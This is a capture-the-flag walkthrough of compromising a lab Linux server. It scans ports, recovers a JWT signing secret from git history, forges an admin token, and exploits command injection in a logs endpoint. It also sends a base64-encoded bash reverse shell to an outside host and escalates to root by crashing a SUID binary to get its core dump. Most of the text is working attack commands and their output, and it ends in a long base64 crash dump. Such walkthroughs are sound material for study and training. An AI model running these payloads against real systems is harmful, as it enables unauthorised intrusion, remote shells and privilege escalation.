> Author: **[z9fr][author-profile]**

## Discovery

### Port Scanning

TCP:

```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
3000/tcp open  http    Node.js (Express middleware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

UDP:

```bash
PORT      STATE         SERVICE
80/udp    open|filtered http
139/udp   open|filtered netbios-ssn
514/udp   open|filtered syslog
520/udp   open|filtered route
1028/udp  open|filtered ms-lsa
1993/udp  open|filtered snmp-tcp-port
5002/udp  open|filtered rfe
5003/udp  open|filtered filemaker
5050/udp  open|filtered mmcc
6346/udp  open|filtered gnutella
9877/udp  open|filtered unknown
16420/udp open|filtered unknown
16711/udp open|filtered unknown
16786/udp open|filtered unknown
16970/udp open|filtered unknown
17459/udp open|filtered unknown
18818/udp open|filtered unknown
19130/udp open|filtered unknown
19600/udp open|filtered unknown
19789/udp open|filtered unknown
19933/udp open|filtered unknown
19998/udp open|filtered unknown
20288/udp open|filtered unknown
20409/udp open|filtered unknown
21000/udp open|filtered irtrans
25003/udp open|filtered icl-twobase4
25709/udp open|filtered unknown
29078/udp open|filtered unknown
31189/udp open|filtered unknown
32773/udp open|filtered sometimes-rpc10
32798/udp open|filtered unknown
34038/udp open|filtered unknown
41896/udp open|filtered unknown
42056/udp open|filtered unknown
42557/udp open|filtered unknown
49171/udp open|filtered unknown
49197/udp open|filtered unknown
49350/udp open|filtered unknown
50708/udp open|filtered unknown
58631/udp open|filtered unknown
59193/udp open|filtered unknown
```

### Web Browsing

The server hosts the documentation of an API and its source code!

![][download-sources]

## Admin on the Web Console

### Finding the Secret

```bash
git log
# commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
# Author: dasithsv <dasithsv@gmail.com>
# Date:   Fri Sep 3 11:30:17 2021 +0530

#     removed .env for security reasons
git show 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
# commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
# Author: dasithsv <dasithsv@gmail.com>
# Date:   Fri Sep 3 11:30:17 2021 +0530

#     removed .env for security reasons

# diff --git a/.env b/.env
# index fb6f587..31db370 100644
# --- a/.env
# +++ b/.env
# @@ -1,2 +1,2 @@
#  DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
# -TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
# +TOKEN_SECRET = secret
```

### Using the Secret for Authentication

This is a JWT token, most likely related to the authentication process.

```bash
grep -ria TOKEN_SECRET --exclude-dir=.git* .
# ./node_modules/got/readme.md: secret: process.env.ACCESS_TOKEN_SECRET
# ./.env:TOKEN_SECRET = secret
# ./routes/auth.js:    const token = jwt.sign({ _id: user.id, name: user.name , email: user.email}, process.env.TOKEN_SECRET )
# ./routes/verifytoken.js:        const verified = jwt.verify(token, process.env.TOKEN_SECRET);
```

```js
const token = jwt.sign({ _id: user.id, name: user.name , email: user.email}, process.env.TOKEN_SECRET )
res.header('auth-token', token).send(token);
```

The JWT token gives access to functionalities in `/priv` & `/logs`:

```js
if (name == 'theadmin'){
    const getLogs = `git log --oneline ${file}`;
    exec(getLogs, (err , output) =>{
        if(err){
            res.status(500).send(err);
            return
        }
        res.json(output);
    })
}
```

And the token is checked by:

```js
try {
    const verified = jwt.verify(token, process.env.TOKEN_SECRET);
    req.user = verified;
    next();
} catch (err) {
    res.status(400).send("Invalid Token");
}
```

```bash
grep -ria admin --exclude-dir=.git* .
# ./routes/private.js:    if (name == 'theadmin'){
# ./routes/private.js:                role:"admin",
# ./routes/private.js:                username:"theadmin",
# ./routes/private.js:                desc : "welcome back admin,"
# ./routes/private.js:    if (name == 'theadmin'){
# ./routes/forgot.js:    if (name == 'theadmin') {
# ./routes/forgot.js:                role: "you are admin",
```

### Crafting an Admin Token

So the idea is to bypass the login by crafting an admin JWT directly:

1) register a new user
2) fetch the JWT token associated
3) tamper the token so that it says "theadmin"
4) connect to `/logs` with the new token

Registering is straightforward:

```bash
curl -v -H 'Content-Type: application/json' \
    --data '{"name": "apehexxx", "email": "0xd@apehex.com", "password": "heyheyhey"}' \
    $'http://10.10.11.120/api/user/register'
# {"user":"apehexxx"}
```

Login in gives us a matching JWT:

```bash
curl -v -H 'Content-Type: application/json' \
    --data '{"email": "0xd@apehex.com", "password": "heyheyhey"}' \
    $'http://10.10.11.120/api/user/login'
# eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTlkNTZhM2FjYWRiZDA0NWJhZDAwYjQiLCJuYW1lIjoiYXBlaGV4eHgiLCJlbWFpbCI6IjB4ZEBhcGVoZXguY29tIiwiaWF0IjoxNjM3NzAyMDI3fQ.xuAvDtPXmVdA6XdbUin_i_dffD3eBz7jqABYUFloGpE
```

Which can be used everywhere:

```bash
curl -v -H 'Content-Type: application/json' \
    -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTlkNTZhM2FjYWRiZDA0NWJhZDAwYjQiLCJuYW1lIjoiYXBlaGV4eHgiLCJlbWFpbCI6IjB4ZEBhcGVoZXguY29tIiwiaWF0IjoxNjM3NzAyMDI3fQ.xuAvDtPXmVdA6XdbUin_i_dffD3eBz7jqABYUFloGpE' \
    $'http://10.10.11.120/api/priv'
# {"role":{"role":"you are normal user","desc":"apehexxx"}}
```

Now we want to modify the token to impersonate the admin:

```python
import jwt
SECRET = 'gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE'
TOKEN = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTlkNTZhM2FjYWRiZDA0NWJhZDAwYjQiLCJuYW1lIjoiYXBlaGV4eHgiLCJlbWFpbCI6IjB4ZEBhcGVoZXguY29tIiwiaWF0IjoxNjM3NzAyMDI3fQ.xuAvDtPXmVdA6XdbUin_i_dffD3eBz7jqABYUFloGpE'
# {'_id': '619d56a3acadbd045bad00b4', 'name': 'apehexxx', 'email': '0xd@apehex.com', 'iat': 1637702027}
data = jwt.decode(TOKEN, SECRET, algorithms=["HS256"])
data['name'] = 'theadmin'
token = jwt.encode(data, SECRET, algorithm="HS256")
```

```bash
curl -H 'Content-Type: application/json' \
    -H 'auth-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJfaWQiOiI2MTlkNTZhM2FjYWRiZDA0NWJhZDAwYjQiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6IjB4ZEBhcGVoZXguY29tIiwiaWF0IjoxNjM3NzAyMDI3fQ.HUS8Pt_2HxKM7xsBAg9CseauQFQovbGny8HBmahstO4' \
    $'http://10.10.11.120/api/priv'
# {"creds":{"role":"admin","username":"theadmin","desc":"welcome back admin"}}
curl -H 'Content-Type: application/json' \
    -H 'auth-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJfaWQiOiI2MTlkNTZhM2FjYWRiZDA0NWJhZDAwYjQiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6IjB4ZEBhcGVoZXguY29tIiwiaWF0IjoxNjM3NzAyMDI3fQ.HUS8Pt_2HxKM7xsBAg9CseauQFQovbGny8HBmahstO4' \
    $'http://10.10.11.120/api/logs'
# {"killed":false,"code":128,"signal":null,"cmd":"git log --oneline undefined"}
```

## System User

The previous URL is vulnerable to command injection:

```bash
curl -H 'Content-Type: application/json' \
    -H 'auth-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJfaWQiOiI2MTlkNTZhM2FjYWRiZDA0NWJhZDAwYjQiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6IjB4ZEBhcGVoZXguY29tIiwiaWF0IjoxNjM3NzAyMDI3fQ.HUS8Pt_2HxKM7xsBAg9CseauQFQovbGny8HBmahstO4' \
    -x 'http://127.0.0.1:8080' \
    $'http://10.10.11.120/api/logs?file=.;id'
# "80bf34c fixed typos 🎉\n0c75212 now we can view logs from server 😃\nab3e953 Added the codes\nuid=1000(dasith) gid=1000(dasith) groups=1000(dasith)\n"
```

```bash
payload=$(echo -ne $'#!/bin/bash\nbash -c \'bash -i >& /dev/tcp/10.10.14.10/9876 0>&1\'' | base64 -w 0|perl -pe 's#\+#%2b#g')
curl -H 'Content-Type: application/json' \
    -H 'auth-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJfaWQiOiI2MTlkNTZhM2FjYWRiZDA0NWJhZDAwYjQiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6IjB4ZEBhcGVoZXguY29tIiwiaWF0IjoxNjM3NzAyMDI3fQ.HUS8Pt_2HxKM7xsBAg9CseauQFQovbGny8HBmahstO4' \
    -x 'http://127.0.0.1:8080' \
    $'http://10.10.11.120/api/logs?file=.;echo+-n+'"${payload}"'|base64+-d|bash'
```

## Escalation to System Root

```bash
find / -type f -perm -u=s 2>/dev/null
# /opt/count
ls -lah /opt/
# total 56K
# drwxr-xr-x  2 root root 4.0K Oct  7 10:06 .
# drwxr-xr-x 20 root root 4.0K Oct  7 15:01 ..
# -rw-r--r--  1 root root 3.7K Oct  7 10:01 code.c
# -rw-r--r--  1 root root  16K Oct  7 10:01 .code.c.swp
# -rwsr-xr-x  1 root root  18K Oct  7 10:03 count
# -rw-r--r--  1 root root 4.6K Oct  7 10:04 valgrind.log
cat /opt/code.c
# int main()
# {
#     char path[100];
#     int res;
#     struct stat path_s;
#     char summary[4096];

#     printf("Enter source file/directory name: ");
#     scanf("%99s", path);
#     getchar();
#     stat(path, &path_s);
#     if(S_ISDIR(path_s.st_mode))
#         dircount(path, summary);
#     else
#         filecount(path, summary);

#     // drop privs to limit file write
#     setuid(getuid());
#     // Enable coredump generation
#     prctl(PR_SET_DUMPABLE, 1); <=====================================
#     printf("Save results a file? [y/N]: ");
#     res = getchar();
#     if (res == 121 || res == 89) {
#         printf("Path: ");
#         scanf("%99s", path);
#         FILE *fp = fopen(path, "a");
#         if (fp != NULL) {
#             fputs(summary, fp);
#             fclose(fp);
#         } else {
#             printf("Could not open %s for writing\n", path);
#         }
#     }

#     return 0;
# }
```

There's this weird / uncalled for `prctl(PR_SET_DUMPABLE, 1)` instruction: it
makes the process dumpable. Upon crash it will produce a report in `/var/crash`.

So we'll open 2 shells, one for running the binary and the other to crash it.

On the first one:

```bash
/opt/count -p
# /root/root.txt
# y
```

And the second shell:

```bash
ps ax | grep -ia count
   #  822 ?        Ssl    0:00 /usr/lib/accountsservice/accounts-daemon
   # 3403 ?        S      0:00 /opt/count -p
   # 3407 ?        S      0:00 grep --color=auto -ia count
kill -BUS 3403
```

Which results in `bash: [1375: 3 (255)] tcsetattr: Inappropriate ioctl for device`
and the file:

```bash
ls -lah /var/crash
# total 88K
# drwxrwxrwt  2 root   root   4.0K Nov 23 23:16 .
# drwxr-xr-x 14 root   root   4.0K Aug 13 05:12 ..
# -rw-r-----  1 root   root    27K Oct  6 18:01 _opt_count.0.crash
# -rw-r-----  1 dasith dasith  28K Nov 23 23:16 _opt_count.1000.crash
# -rw-r-----  1 root   root    24K Oct  5 14:24 _opt_countzz.0.crash
cat /var/crash/_opt_count.1000.crash
# CoreDump: base64
#  H4sICAAAAAAC/0NvcmVEdW1wAA==
#  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